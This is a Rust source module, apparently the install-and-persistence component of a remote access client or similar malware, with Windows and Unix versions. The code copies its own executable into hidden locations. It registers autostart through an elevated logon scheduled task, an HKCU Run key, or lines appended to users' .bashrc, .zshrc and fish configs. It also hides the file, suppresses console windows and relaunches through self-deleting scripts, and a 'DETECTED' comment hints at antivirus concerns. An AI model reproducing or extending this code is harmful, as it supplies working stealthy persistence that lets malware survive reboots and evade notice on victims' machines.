#[cfg(windows)]
mod windows {
    use winapi::um::processthreadsapi::OpenProcessToken;
    use winapi::um::securitybaseapi::GetTokenInformation;
    use winapi::um::winnt::{ TokenElevation, HANDLE, TOKEN_ELEVATION, TOKEN_QUERY };
    use std::ptr;
    use std::os::windows::process::CommandExt;

    use std::{
        env,
        fs::{self, File},
        io::{Read, Write},
        path::PathBuf,
        process::Command,
        thread::sleep,
        time::Duration,
    };

    pub fn is_elevated() -> bool {
        unsafe {
            let mut handle: HANDLE = ptr::null_mut();
            if
                OpenProcessToken(
                    winapi::um::processthreadsapi::GetCurrentProcess(),
                    TOKEN_QUERY,
                    &mut handle
                ) != 0
            {
                let mut elevation: TOKEN_ELEVATION = std::mem::zeroed();
                let mut size = std::mem::size_of::<TOKEN_ELEVATION>() as u32;
                if
                    GetTokenInformation(
                        handle,
                        TokenElevation,
                        &mut elevation as *mut _ as *mut _,
                        size,
                        &mut size
                    ) != 0
                {
                    return elevation.TokenIsElevated != 0;
                }
            }
        }
        false
    }

    fn get_special_folder(name: &str) -> Option<PathBuf> {
        let folder: Option<String> = match name.to_lowercase().as_str() {
            "appdata" => env::var("APPDATA").ok(),
            "localappdata" => env::var("LOCALAPPDATA").ok(),
            "temp" => env::var("TEMP").ok(),
            "system" => Some("C:\\Windows\\System32".to_string()),
            "desktop" => {
                let userprofile = env::var("USERPROFILE").ok()?;
                Some(format!("{}\\Desktop", userprofile))
            },
            "programfiles" => env::var("ProgramFiles").ok(),
            _ => None,
        };

        folder.map(PathBuf::from)
    }

    pub fn install(folder: String, filename: String, hidden: bool) {
        println!("Installing client to {}", folder);
        let install_dir = match get_special_folder(folder.as_str()) {
            Some(path) => path,
            None => {
                eprintln!("Invalid install folder.");
                return;
            }
        };

        let install_path = install_dir.join(filename);

        let current_exe = std::env::current_exe().unwrap();
        if current_exe == install_path {
            return; // Already installed
        }

        const HIDE: u32 = 0x08000000;

        // Set persistence
        if is_elevated() { // DETECTED
            // schtasks
            let task_name = install_path.file_stem().unwrap().to_string_lossy();
            let task_cmd = format!(
                "schtasks /create /f /sc onlogon /rl highest /tn \"{}\" /tr '\"{}\"'",
                task_name, install_path.display()
            );
            let _ = Command::new("cmd")
                .creation_flags(HIDE)
                .args(["/c", &task_cmd])
                .output();
        } else {
            // Registry (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
            let value_name = install_path.file_stem().unwrap().to_string_lossy();
            let _ = Command::new("reg")
                .args([
                    "add",
                    r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
                    "/v",
                    &value_name,
                    "/d",
                    &format!("\"{}\"", install_path.display()),
                    "/f",
                ])
                .creation_flags(HIDE)
                .output();
        }

        // Copy executable
        if install_path.exists() {
            let _ = fs::remove_file(&install_path);
            sleep(Duration::from_secs(1));
        }

        if let Ok(mut target) = File::create(&install_path) {
            if let Ok(mut current) = File::open(&current_exe) {
                let mut buffer = Vec::new();
                let _ = current.read_to_end(&mut buffer);
                let _ = target.write_all(&buffer);
            }
        }

        // Optional: hide file (very basic, can use attrib command)
        if hidden {
            let _ = Command::new("attrib")
                .args(["+h", install_path.to_str().unwrap()])
                .creation_flags(HIDE)
                .output();
        }

        // Relaunch from new path using temp .bat
        let batch_path = std::env::temp_dir().join("r.bat");
        if let Ok(mut bat) = File::create(&batch_path) {
            let _ = writeln!(bat, "@echo off");
            let _ = writeln!(bat, "timeout /t 3 > NUL");
            let _ = writeln!(bat, "start \"\" \"{}\"", install_path.display());
            let _ = writeln!(bat, "del \"%~f0\" /f /q");
        }

        let _ = Command::new(batch_path)
            .creation_flags(HIDE)
            .spawn();

        std::process::exit(0);
    }
}

#[cfg(unix)]
mod unix {
    use std::{
        env,
        fs::{self, File, OpenOptions},
        io::{Read, Write},
        path::PathBuf,
        process::Command,
        thread::sleep,
        time::Duration,
    };

    // use rand::distributions::Alphanumeric; // Not available in rand 0.9.x
    use rand::rng;
    use rand::Rng;

    pub fn is_elevated() -> bool {
        unsafe { libc::geteuid() == 0 }
    }

    fn get_special_folder(name: &str) -> Option<PathBuf> {
        let folder: Option<String> = match name.to_lowercase().as_str() {
            "appdata" => env::var("XDG_CONFIG_HOME").ok().or_else(|| env::var("HOME").ok().map(|h| format!("{}/.config", h))),
            "localappdata" => env::var("XDG_DATA_HOME").ok().or_else(|| env::var("HOME").ok().map(|h| format!("{}/.local/share", h))),
            "temp" => env::var("TMPDIR").ok().or_else(|| env::var("TMP").ok()),
            "system" => Some("/usr/bin".to_string()),
            "desktop" => {
                let home = env::var("HOME").ok()?;
                Some(format!("{}/Desktop", home))
            },
            "programfiles" => Some("/usr/bin".to_string()),
            _ => None,
        };

        folder.map(PathBuf::from)
    }

    fn add_to_shell_config(install_path: &PathBuf) {
        let home = match env::var("HOME") {
            Ok(home) => home,
            Err(_) => return,
        };

        let shell_configs = vec![
            format!("{}/.bashrc", home),
            format!("{}/.zshrc", home),
            format!("{}/.config/fish/config.fish", home),
        ];

        let startup_command = format!("{} >/dev/null 2>&1 &", install_path.display());
        let marker_comment = "# Auto-start client";

        for config_path in shell_configs {
            let config_file = PathBuf::from(&config_path);
            
            // Check if config file exists
            if !config_file.exists() {
                continue;
            }

            // Read existing content
            let mut content = String::new();
            if let Ok(mut file) = File::open(&config_file) {
                if file.read_to_string(&mut content).is_err() {
                    continue;
                }
            }

            // Check if startup command already exists
            if content.contains(&startup_command) {
                continue;
            }

            // Add startup command to config file
            if let Ok(mut file) = OpenOptions::new()
                .write(true)
                .append(true)
                .open(&config_file) 
            {
                let _ = writeln!(file, "\n{}", marker_comment);
                let _ = writeln!(file, "{}", startup_command);
            }
        }
    }

    pub fn install(_folder: String, filename: String, hidden: bool) {
        let home = match env::var("HOME") {
            Ok(home) => home,
            Err(_) => {
                eprintln!("Could not determine home directory.");
                return;
            }
        };
        let config_dir = PathBuf::from(format!("{}/.config", home));
        let marker_path = config_dir.join(".clientd_path");

        // If marker file exists, read the path and check if we're already installed
        if let Ok(path) = std::fs::read_to_string(&marker_path) {
            let path = path.trim();
            if let Ok(current_exe) = std::env::current_exe() {
                if current_exe == PathBuf::from(path) {
                    // Already installed and running from install path
                    return;
                }
            }
        }

        // Try up to 5 random folders to avoid permission issues
        let mut rng = rand::rng();
        let mut install_dir = None;
        let mut install_path = None;
        for _ in 0..5 {
            let random_folder = match fs::read_dir(&config_dir) {
                Ok(entries) => {
                    let folders: Vec<_> = entries.filter_map(|e| {
                        let e = e.ok()?;
                        let md = e.metadata().ok()?;
                        if md.is_dir() { Some(e.file_name().to_string_lossy().to_string()) } else { None }
                    }).collect();
                    if folders.is_empty() {
                        format!("folder_{}", rng.gen::<u64>())
                    } else {
                        let idx = rng.random_range(0..folders.len());
                        folders[idx].clone()
                    }
                },
                Err(_) => format!("folder_{}", rng.gen::<u64>()),
            };
            let try_dir = config_dir.join(&random_folder);
            let try_path = try_dir.join(&filename);
            // Try to create the directory if it doesn't exist
            if !try_dir.exists() {
                if let Err(e) = fs::create_dir_all(&try_dir) {
                    eprintln!("Failed to create install directory: {}", e);
                    continue;
                }
            }
            // Check if we can write to the directory
            if fs::OpenOptions::new().write(true).create(true).open(&try_path).is_ok() {
                install_dir = Some(try_dir);
                install_path = Some(try_path);
                break;
            }
        }
        let install_dir = match install_dir {
            Some(d) => d,
            None => {
                eprintln!("Could not find a writable install directory in ~/.config");
                return;
            }
        };
        let install_path = install_path.unwrap();
        println!("Installing client to {}", install_path.display());

        let current_exe = std::env::current_exe().unwrap();
        if current_exe == install_path {
            // Already installed and running from install path
            return;
        }

        // Copy executable
        if install_path.exists() {
            // If not writable, abort
            if fs::OpenOptions::new().write(true).open(&install_path).is_err() {
                eprintln!("Install path {} exists but is not writable", install_path.display());
                return;
            }
        }
        if let Ok(mut target) = File::create(&install_path) {
            if let Ok(mut current) = File::open(&current_exe) {
                let mut buffer = Vec::new();
                let _ = current.read_to_end(&mut buffer);
                let _ = target.write_all(&buffer);
            }
        }

        // Set executable permissions
        let _ = Command::new("chmod")
            .args(["+x", install_path.to_str().unwrap()])
            .output();

        // Write marker file
        let _ = std::fs::write(&marker_path, install_path.to_string_lossy().as_bytes());

        // Add to shell configs for persistence
        add_to_shell_config(&install_path);

        // Optional: hide file
        if hidden {
            let _ = Command::new("chmod")
                .args(["-r", install_path.to_str().unwrap()])
                .output();
        }

        // Relaunch from new path using a shell script
        let script_path = std::env::temp_dir().join("r.sh");
        if let Ok(mut script) = File::create(&script_path) {
            let _ = writeln!(script, "#!/bin/sh");
            let _ = writeln!(script, "sleep 3");
            let _ = writeln!(script, "{} >/dev/null 2>&1 &", install_path.display());
            let _ = writeln!(script, "rm \"$0\"");
        }

        let _ = Command::new("chmod")
            .args(["+x", script_path.to_str().unwrap()])
            .output();

        let _ = Command::new(script_path)
            .spawn();

        std::process::exit(0);
    }
}

#[cfg(windows)]
pub use windows::*;

#[cfg(unix)]
pub use unix::*;

